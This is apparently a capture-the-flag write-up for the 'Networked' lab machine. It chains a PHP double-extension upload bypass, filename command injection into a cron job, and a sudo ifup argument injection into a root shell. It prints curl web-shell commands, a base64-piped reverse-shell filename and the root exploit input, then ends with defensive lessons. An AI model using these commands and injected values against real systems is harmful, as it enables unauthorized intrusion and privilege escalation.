Networked

Three separate flaws — an upload filter, a cron job, and a sudo script — chain together into full root compromise.

Enumeration

Recon & Source Disclosure

A standard port scan showed only SSH and Apache (port 80) exposed. Directory brute-forcing with gobuster turned up upload.php, photos.php, and a backup folder containing a .tar archive of the site's PHP source — an immediate, unauthenticated leak of application logic.

gobuster dir -u http://10.10.10.146/ -w common.txt
/backup (Status: 200)
/photos.php (Status: 200)
/upload.php (Status: 200)

Pulling and extracting the tar archive gave full visibility into the upload validation logic, setting up the first vulnerability.

Foothold

Insecure Upload Filter → RCE as apache

The upload filter checked both the MIME type (via magic bytes) and the file extension — but only validated the extension at the end of the filename. Neither check considered a disallowed extension embedded earlier in the name.

Mechanism first

A file named shell.php.png starts with valid PNG magic bytes (passing the MIME check) and ends in .png (passing the extension check), but Apache's handler still matches .php anywhere it appears in typical AddHandler configurations, causing the file to be executed as PHP regardless of the trailing extension.

curl -F "file=@shell.php.png" http://10.10.10.146/upload.php
curl "http://10.10.10.146/uploads/shell.php.png?cmd=id"
uid=48(apache) gid=48(apache) groups=48(apache)

This yielded command execution as the low-privilege apache service account.

Lateral Movement

Filename-Based Command Injection via Cron

Enumerating /home/guly revealed a root-owned cron job, check_attack.php, running every three minutes as user guly. It scanned the uploads directory and deleted files it flagged as invalid using unsanitized shell concatenation:

exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
Mechanism first

The variable $value (the uploaded filename) was inserted directly into a shell command with no sanitization. A semicolon in the filename terminates the intended rm invocation and allows an attacker-supplied command to execute immediately after — command injection driven entirely by filename content rather than file contents.

Since Linux filenames can't contain /, a base64-encoded reverse shell was embedded and decoded inline, then dropped directly into the uploads directory from the existing apache shell (bypassing upload.php's IP-based renaming logic):

;echo <base64_payload>|base64 -d|bash;.png

When the cron fired, the injected command executed, returning a shell as guly.

Privilege Escalation

Sudo Script Bypass via ifup Argument Injection

sudo -l as guly showed passwordless root access to a single script:

(root) NOPASSWD: /usr/local/sbin/changename.sh

The script interactively builds a network interface config from four fields and filters input with a regex blocking common injection characters (;, |, backticks) — but it still permits spaces.

Mechanism first

The script's output is later consumed by ifup, which is known to mishandle space-delimited values in fields like NAME, treating anything after the first space as a separate command to execute at root. Blocking special characters wasn't sufficient because the underlying interpreter's parsing bug used whitespace, not punctuation, as its trigger.

sudo /usr/local/sbin/changename.sh
Interface NAME: x /bin/bash
[...]
# whoami
root

Supplying x /bin/bash as the NAME value caused /bin/bash to execute as root when the script invoked /sbin/ifup guly0, yielding a root shell.

Closing

Wrap-up

Networked strings together three independently minor flaws — a filename-order-blind upload filter, an unsanitized filename passed to exec(), and a whitespace-blind sudo script filter — into a full unauthenticated-to-root chain. The unifying theme is validation that blocks known-bad patterns instead of reasoning about the complete space of dangerous input, letting each downstream consumer (Apache's handler, the shell, and ifup) interpret attacker data in an unintended way.

  • Prefer allow-list, complete-structure validation over blocklisting specific characters or suffixes.
  • Never build shell commands via string concatenation with attacker-influenced data, including filenames.
  • Audit every script granted NOPASSWD sudo access as if it ran directly as root — because effectively, it does.
